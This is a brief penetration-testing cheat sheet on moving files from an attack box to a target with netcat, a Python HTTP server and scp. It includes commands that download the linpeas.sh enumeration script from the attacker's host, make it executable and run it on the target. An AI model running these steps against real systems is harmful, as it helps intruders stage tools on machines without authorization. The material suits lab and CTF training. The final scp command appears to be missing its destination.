### Transfering Files from your Attack Box to the Target
#### Netcat File Transfer
- Step 1
- Create a file on the target box in the /tmp directory
```
touch file.txt
```
- Set up the listener and direct STDOUT into the new file
```
nc -nlvp 1234 > file.txt
```
-Send the file
```
nc [target box ip] 1234 < file-to-be-transfered.txt
```

#### Python HTTP Server File Transfer
- Start the Python Server in the directory where the file is located that you want to transfer
```
python3 -m http.server
```
- Above is for python3
```
python -m SimpleHTTPServer 8000
```
- Above is for python
- You can optionally specify a port that you want the server to run on (it defaults to 8000)
```
python3 -m http.server 80
```
- Wget the file from the target box
```
wget http://172.16.6.1:8000/linpeas.sh
```
- Change permissions
```
chmod +x linpeas.sh
```
- Run the transfered file
```
./linpeas.sh
```

#### Secure Copy Protocol
- SCP a file from your attack box to a target box
```
scp /home/kali/Documents/linpeas.sh user@10.10.10.100:/tmp
```
- This command copies the file linpeas.sh to user on the target box and places it in the /tmp directory.
- SCP a file from your attack box while on the command line of a target box
```
scp jack@172.16.6.1:/home/kali/Documents/linpeas.sh
```
